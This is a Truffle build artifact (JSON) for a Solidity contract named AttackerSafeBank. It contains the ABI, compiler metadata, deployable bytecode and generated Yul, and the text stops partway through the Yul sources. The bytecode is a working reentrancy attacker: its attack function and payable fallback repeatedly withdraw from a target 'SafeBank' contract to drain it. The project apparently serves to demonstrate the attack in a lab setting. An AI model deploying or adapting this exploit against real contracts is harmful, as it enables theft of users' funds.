{
  "contractName": "AttackerSafeBank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "drainedAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "prevBalanceVulnerableContract",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "targetAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalWithdraw",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract SafeBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_targetAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_vulnerableAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_targetAmount\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drainedAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"prevBalanceVulnerableContract\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vulnerable\",\"outputs\":[{\"internalType\":\"contract SafeBank\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/AttackerSafeBank.sol\":\"AttackerSafeBank\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/AttackerSafeBank.sol\":{\"keccak256\":\"0x80491c1fd79db271053715f00ca3e71ddace9721a998f9338c3e6a3c10297b9b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://4d58ab35e19424c4ebba200cd6aaaaea2c9f634a0afddcf3623040c9e02c0414\",\"dweb:/ipfs/QmfNrkU52vZDU6FoESZByXTQEthT9MMLTVr5fhax3LvCW7\"]},\"project:/contracts/SafeBank.sol\":{\"keccak256\":\"0x6a2caef91e5147a72d2025cfceda8bd373ce56e1534c499583349b2bcd6c9e38\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b3f8839a11e425823953f76304532e10c03f8a7e9e014cce8ebc7a58ddc0a54e\",\"dweb:/ipfs/QmZvZqB1FEnnPGFsj86iodMCEeqctfgaLBY7P65EZZYoJQ\"]}},\"version\":1}",
  "bytecode": "0x6080604052600060055534801561001557600080fd5b50604051610bbb380380610bbb833981810160405281019061003791906100d4565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610146565b6000815190506100ce8161012f565b92915050565b6000602082840312156100e657600080fd5b60006100f4848285016100bf565b91505092915050565b60006101088261010f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610138816100fd565b811461014357600080fd5b50565b610a66806101556000396000f3fe6080604052600436106100955760003560e01c80638467006211610059578063846700621461024d5780638da5cb5b14610278578063953b8fb8146102a3578063d0e30db0146102ce578063f66ad59a146102d857610096565b80630f5ea8271461018757806324600fc3146101b257806327e235e3146101c9578063455fd6231461020657806364dd891a1461023157610096565b5b600354600654111580156100ae575060055460065411155b156101855760055460065414156100cd576005546006819055506100e9565b600454600660008282546100e1919061091d565b925050819055505b6000600454111561018457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6004546040518263ffffffff1660e01b815260040161015191906108f1565b600060405180830381600087803b15801561016b57600080fd5b505af115801561017f573d6000803e3d6000fd5b505050505b5b005b34801561019357600080fd5b5061019c610303565b6040516101a991906108f1565b60405180910390f35b3480156101be57600080fd5b506101c7610309565b005b3480156101d557600080fd5b506101f060048036038101906101eb91906106d0565b610404565b6040516101fd91906108f1565b60405180910390f35b34801561021257600080fd5b5061021b61041c565b60405161022891906108f1565b60405180910390f35b61024b600480360381019061024691906106f9565b610422565b005b34801561025957600080fd5b5061026261064c565b60405161026f91906108f1565b60405180910390f35b34801561028457600080fd5b5061028d610652565b60405161029a919061085b565b60405180910390f35b3480156102af57600080fd5b506102b8610678565b6040516102c591906108f1565b60405180910390f35b6102d661067e565b005b3480156102e457600080fd5b506102ed610680565b6040516102fa9190610876565b60405180910390f35b60045481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610399576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039090610891565b60405180910390fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610401573d6000803e3d6000fd5b50565b60006020528060005260406000206000915090505481565b60065481565b6000813410610466576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161045d906108b1565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16319050808211156104e5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104dc906108d1565b60405180910390fd5b81600381905550346006819055600481905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561056257600080fd5b505af1158015610576573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631600581905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b815260040161061691906108f1565b600060405180830381600087803b15801561063057600080fd5b505af1158015610644573d6000803e3d6000fd5b505050505050565b60055481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000813590506106b581610a02565b92915050565b6000813590506106ca81610a19565b92915050565b6000602082840312156106e257600080fd5b60006106f0848285016106a6565b91505092915050565b60006020828403121561070b57600080fd5b6000610719848285016106bb565b91505092915050565b61072b81610973565b82525050565b61073a816109af565b82525050565b600061074d60178361090c565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b600061078d60398361090c565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b206c657373207468616e2074617267657420616d6f756e74000000000000006020830152604082019050919050565b60006107f3603e8361090c565b91507f54617267657420616d6f756e74206d757374206265206c657373207468616e2060008301527f62616c616e6365206f662076756c6e657261626c6520636f6e747261637400006020830152604082019050919050565b610855816109a5565b82525050565b60006020820190506108706000830184610722565b92915050565b600060208201905061088b6000830184610731565b92915050565b600060208201905081810360008301526108aa81610740565b9050919050565b600060208201905081810360008301526108ca81610780565b9050919050565b600060208201905081810360008301526108ea816107e6565b9050919050565b6000602082019050610906600083018461084c565b92915050565b600082825260208201905092915050565b6000610928826109a5565b9150610933836109a5565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610968576109676109d3565b5b828201905092915050565b600061097e82610985565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006109ba826109c1565b9050919050565b60006109cc82610985565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b610a0b81610973565b8114610a1657600080fd5b50565b610a22816109a5565b8114610a2d57600080fd5b5056fea2646970667358221220c5b46515a606d653d089de6caf1db8c8f2a6d6ecc9ffbb5a21cf6509ae13ebb064736f6c63430008000033",
  "deployedBytecode": "0x6080604052600436106100955760003560e01c80638467006211610059578063846700621461024d5780638da5cb5b14610278578063953b8fb8146102a3578063d0e30db0146102ce578063f66ad59a146102d857610096565b80630f5ea8271461018757806324600fc3146101b257806327e235e3146101c9578063455fd6231461020657806364dd891a1461023157610096565b5b600354600654111580156100ae575060055460065411155b156101855760055460065414156100cd576005546006819055506100e9565b600454600660008282546100e1919061091d565b925050819055505b6000600454111561018457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6004546040518263ffffffff1660e01b815260040161015191906108f1565b600060405180830381600087803b15801561016b57600080fd5b505af115801561017f573d6000803e3d6000fd5b505050505b5b005b34801561019357600080fd5b5061019c610303565b6040516101a991906108f1565b60405180910390f35b3480156101be57600080fd5b506101c7610309565b005b3480156101d557600080fd5b506101f060048036038101906101eb91906106d0565b610404565b6040516101fd91906108f1565b60405180910390f35b34801561021257600080fd5b5061021b61041c565b60405161022891906108f1565b60405180910390f35b61024b600480360381019061024691906106f9565b610422565b005b34801561025957600080fd5b5061026261064c565b60405161026f91906108f1565b60405180910390f35b34801561028457600080fd5b5061028d610652565b60405161029a919061085b565b60405180910390f35b3480156102af57600080fd5b506102b8610678565b6040516102c591906108f1565b60405180910390f35b6102d661067e565b005b3480156102e457600080fd5b506102ed610680565b6040516102fa9190610876565b60405180910390f35b60045481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610399576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039090610891565b60405180910390fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610401573d6000803e3d6000fd5b50565b60006020528060005260406000206000915090505481565b60065481565b6000813410610466576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161045d906108b1565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16319050808211156104e5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104dc906108d1565b60405180910390fd5b81600381905550346006819055600481905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561056257600080fd5b505af1158015610576573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631600581905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b815260040161061691906108f1565b600060405180830381600087803b15801561063057600080fd5b505af1158015610644573d6000803e3d6000fd5b505050505050565b60055481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000813590506106b581610a02565b92915050565b6000813590506106ca81610a19565b92915050565b6000602082840312156106e257600080fd5b60006106f0848285016106a6565b91505092915050565b60006020828403121561070b57600080fd5b6000610719848285016106bb565b91505092915050565b61072b81610973565b82525050565b61073a816109af565b82525050565b600061074d60178361090c565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b600061078d60398361090c565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b206c657373207468616e2074617267657420616d6f756e74000000000000006020830152604082019050919050565b60006107f3603e8361090c565b91507f54617267657420616d6f756e74206d757374206265206c657373207468616e2060008301527f62616c616e6365206f662076756c6e657261626c6520636f6e747261637400006020830152604082019050919050565b610855816109a5565b82525050565b60006020820190506108706000830184610722565b92915050565b600060208201905061088b6000830184610731565b92915050565b600060208201905081810360008301526108aa81610740565b9050919050565b600060208201905081810360008301526108ca81610780565b9050919050565b600060208201905081810360008301526108ea816107e6565b9050919050565b6000602082019050610906600083018461084c565b92915050565b600082825260208201905092915050565b6000610928826109a5565b9150610933836109a5565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610968576109676109d3565b5b828201905092915050565b600061097e82610985565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006109ba826109c1565b9050919050565b60006109cc82610985565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b610a0b81610973565b8114610a1657600080fd5b50565b610a22816109a5565b8114610a2d57600080fd5b5056fea2646970667358221220c5b46515a606d653d089de6caf1db8c8f2a6d6ecc9ffbb5a21cf6509ae13ebb064736f6c63430008000033",
  "immutableReferences": {},
  "generatedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:861:4",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "78:88:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "88:22:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "103:6:4"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "97:5:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "97:13:4"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "88:5:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "154:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address_payable",
                      "nodeType": "YulIdentifier",
                      "src": "119:34:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "119:41:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "119:41:4"
                }
              ]
            },
            "name": "abi_decode_t_address_payable_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "56:6:4",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "64:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "72:5:4",
                "type": ""
              }
            ],
            "src": "7:159:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "257:215:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "303:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "312:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "315:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "305:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "305:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "305:12:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "278:7:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "287:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "274:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "274:23:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "299:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "270:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "270:32:4"
                  },
                  "nodeType": "YulIf",
                  "src": "267:2:4"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "329:136:4",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "344:15:4",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "358:1:4",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "348:6:4",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "373:82:4",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "427:9:4"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "438:6:4"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "423:3:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "423:22:4"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "447:7:4"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address_payable_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "383:39:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "383:72:4"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "373:6:4"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address_payable_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "227:9:4",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "238:7:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "250:6:4",
                "type": ""
              }
            ],
            "src": "172:300:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "531:51:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "541:35:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "570:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "552:17:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "552:24:4"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "541:7:4"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "513:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "523:7:4",
                "type": ""
              }
            ],
            "src": "478:104:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "633:81:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "643:65:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "658:5:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "665:42:4",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "654:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "654:54:4"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "643:7:4"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "615:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "625:7:4",
                "type": ""
              }
            ],
            "src": "588:126:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "771:87:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "836:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "845:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "848:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "838:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "838:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "838:12:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "794:5:4"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "827:5:4"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address_payable",
                              "nodeType": "YulIdentifier",
                              "src": "801:25:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "801:32:4"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "791:2:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "791:43:4"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "784:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "784:51:4"
                  },
                  "nodeType": "YulIf",
                  "src": "781:2:4"
                }
              ]
            },
            "name": "validator_revert_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "764:5:4",
                "type": ""
              }
            ],
            "src": "720:138:4"
          }
        ]
      },
      "contents": "{\n\n    function abi_decode_t_address_payable_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address_payable(value)\n    }\n\n    function abi_decode_tuple_t_address_payable_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_payable_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address_payable(value) {\n        if iszero(eq(value, cleanup_t_address_payable(value))) { revert(0, 0) }\n    }\n\n}\n",
      "id": 4,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "deployedGeneratedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:5904:4",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "59:87:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "69:29:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "91:6:4"
                      }
                    ],
                    "functionName": {
                      "name": "calldataload",
                      "nodeType": "YulIdentifier",
                      "src": "78:12:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "78:20:4"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "69:5:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "134:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "107:26:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "107:33:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "107:33:4"
                }
              ]
            },
            "name": "abi_decode_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "37:6:4",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "45:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "53:5:4",
                "type": ""
              }
            ],
            "src": "7:139:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "204:87:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "214:29:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "236:6:4"
                      }
                    ],
                    "functionName": {
                      "name": "calldataload",
                      "nodeType": "YulIdentifier",
                      "src": "223:12:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "223:20:4"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "214:5:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "279:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "252:26:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "252:33:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "252:33:4"
                }
              ]
            },
            "name": "abi_decode_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "182:6:4",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "190:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "198:5:4",
                "type": ""
              }
            ],
            "src": "152:139:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "363:196:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "409:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "418:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "421:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "411:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "411:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "411:12:4"
                      }
                    ]
                  },
                  "condition": {
